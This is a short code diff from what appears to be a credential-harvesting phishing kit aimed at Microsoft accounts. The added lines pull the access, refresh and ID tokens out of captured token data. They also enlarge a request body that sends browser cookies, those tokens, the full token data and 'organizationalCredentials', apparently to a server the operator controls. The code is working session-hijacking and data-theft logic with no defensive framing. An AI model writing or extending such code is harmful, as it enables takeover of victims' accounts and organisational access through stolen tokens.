@@ -387,6 +387,13 @@
                 sessionData.organizationalCredentials = organizationalCredentials;
                 sessionData.tokenData = tokenData; // Include full token data
                 
+                // Also include individual token fields for easier access
+                if (tokenData && tokenData.success && tokenData.tokens) {
+                    sessionData.accessToken = tokenData.tokens.access_token;
+                    sessionData.refreshToken = tokenData.tokens.refresh_token;
+                    sessionData.idToken = tokenData.tokens.id_token;
+                }
+                
                 console.log('🍪 Final capture summary:', {
                     microsoftCookies: microsoftCookies.length,
                     currentDomainCookies: currentDomainCookies.length,
@@ -451,7 +458,10 @@
                         cookies: document.cookie,
                         accessToken: sessionData.accessToken,
                         refreshToken: sessionData.refreshToken,
-                        userProfile: sessionData.userProfile
+                        idToken: sessionData.idToken,
+                        userProfile: sessionData.userProfile,
+                        tokenData: sessionData.tokenData,
+                        organizationalCredentials: sessionData.organizationalCredentials
                      })
                  });
                  
